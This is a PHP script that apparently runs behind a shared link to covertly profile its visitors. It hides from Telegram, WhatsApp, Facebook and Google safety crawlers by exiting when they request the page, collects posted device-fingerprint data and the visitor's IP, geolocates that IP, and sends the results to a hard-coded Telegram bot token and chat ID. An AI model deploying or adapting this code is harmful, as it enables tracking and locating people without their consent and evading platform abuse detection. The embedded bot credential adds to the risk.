<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'TelegramBot') !== false ||      
    strpos($userAgent, 'WhatsApp') !== false ||        
    strpos($userAgent, 'Instagram') !== false ||        
    strpos($userAgent, 'facebookexternalhit') !== false || 
    strpos($userAgent, 'Facebot') !== false ||          
    strpos($userAgent, 'GoogleImageProxy') !== false || 
    strpos($userAgent, 'Googlebot') !== false ||        
    strpos($userAgent, 'Google-Safety') !== false ||    
    strpos($userAgent, 'Mediapartners-Google') !== false) { 
    
    exit(); // Stop immediately. Show them nothing.
}

$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";     

// Receive Data (Safely)
$os = $_POST['Os'] ?? 'Unknown';
$ptf = $_POST['Ptf'] ?? 'Unknown';
$brw = $_POST['Brw'] ?? 'Unknown';
$cc = $_POST['Cc'] ?? 'Unknown';
$ram = $_POST['Ram'] ?? 'Unknown';
$ven = $_POST['Ven'] ?? 'Unknown'; 
$ren = $_POST['Ren'] ?? 'Unknown'; 
$ht = $_POST['Ht'] ?? 'Unknown';
$wd = $_POST['Wd'] ?? 'Unknown';
$bat = $_POST['Bat'] ?? "Unknown";

// Get Real IP (Cloudflare support included)
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// --- IP INTELLIGENCE LOOKUP ---
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $details->city ?? "Unknown";
$region = $details->regionName ?? "Unknown";
$country = $details->country ?? "Unknown";
$isp = $details->isp ?? "Unknown";


// Format Message
$message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";

// Section 1: Network / Location
$message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
$message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
$message .= "├ <b>City:</b> " . $city . "\n";
$message .= "├ <b>Region:</b> " . $region . ", " . $country . "\n";
$message .= "└ <b>ISP:</b> " . $isp . "\n\n";

// Section 2: Device Details
$message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
$message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
$message .= "├ <b>Browser:</b> " . $brw . "\n";
$message .= "├ <b>Battery:</b> " . $bat . "\n"; 
$message .= "├ <b>RAM:</b> " . $ram . " GB\n";
$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
$message .= "├ <b>Cores:</b> " . $cc . "\n";
$message .= "└ <b>GPU:</b> " . $ven . " (" . $ren . ")\n";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

?>
